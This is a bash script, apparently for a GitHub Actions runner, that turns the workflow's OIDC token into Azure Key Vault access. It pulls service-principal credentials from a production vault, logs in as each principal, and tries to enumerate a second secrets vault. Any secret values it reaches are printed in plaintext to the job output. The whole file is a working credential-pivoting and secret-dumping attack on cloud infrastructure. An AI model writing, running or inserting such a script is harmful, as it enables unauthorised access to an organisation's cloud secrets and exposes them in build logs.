#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
for n in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  js=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$n?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
  cid=$(printf '%s' "$js" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("appId",""))')
  sec=$(printf '%s' "$js" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("clientSecret",""))')
  vt=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$cid" -d grant_type=client_credentials --data-urlencode "client_secret=$sec" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
  echo "## $n cid=$cid vt=${#vt}"
  [ -z "$vt" ] && continue
  r=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $vt")
  code=$(printf '%s' "$r" | python3 -c 'import sys,json
d=json.load(sys.stdin)
print("OK" if "value" in d else d.get("error",{}).get("code"))')
  echo "   kv-tbl-sec list: $code"
  if [ "$code" = OK ]; then
    for id in $(printf '%s' "$r" | python3 -c 'import sys,json;[print(x["id"]) for x in json.load(sys.stdin)["value"]]'); do
      v=$(curl -sS "$id?api-version=7.4" -H "Authorization: Bearer $vt" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
      echo "   SEC ${id##*/} = $v"
    done
  fi
done
echo END
